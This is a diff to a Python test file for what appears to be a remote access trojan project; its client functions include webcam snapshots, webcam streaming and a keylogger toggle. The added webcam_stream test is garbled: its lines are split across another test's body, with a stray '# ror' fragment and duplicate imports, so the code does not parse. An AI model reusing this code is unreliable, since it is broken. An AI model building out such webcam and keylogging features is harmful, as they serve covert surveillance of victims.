@@ -1,5 +1,6 @@
 from unittest.mock import MagicMock, patch
 
+from rat_project.client.client_actions_os import get_system_info, webcam_snapshot, webcam_stream
 from rat_project.client.client_actions_os import get_system_info, webcam_snapshot
 from rat_project.client.client_actions_os import get_system_info, toggle_keylogger
 import tempfile
@@ -17,6 +18,10 @@ def test_get_system_info_returns_string() -> None:
     assert isinstance(result, str)
     assert result != ""
 
+
+def test_webcam_stream_no_webcam_sends_error() -> None:
+    # Given: no webcam available
+    mock_conn = MagicMock()
 
 def test_webcam_snapshot_returns_base64_string() -> None:
     # Given: a working webcam
@@ -40,6 +45,12 @@ def test_webcam_snapshot_no_webcam_returns_empty_string() -> None:
         mock_cap = MagicMock()
         mock_cap_class.return_value = mock_cap
         mock_cap.isOpened.return_value = False
+        webcam_stream(mock_conn)
+
+    # ror
+    mock_conn.sendall.assert_called_once()
+    sent = mock_conn.sendall.call_args[0][0].decode()
+    assert "stream_error" in sent
         result = webcam_snapshot()
     assert result == ""
 def test_toggle_keylogger_start_returns_confirmation() -> None:
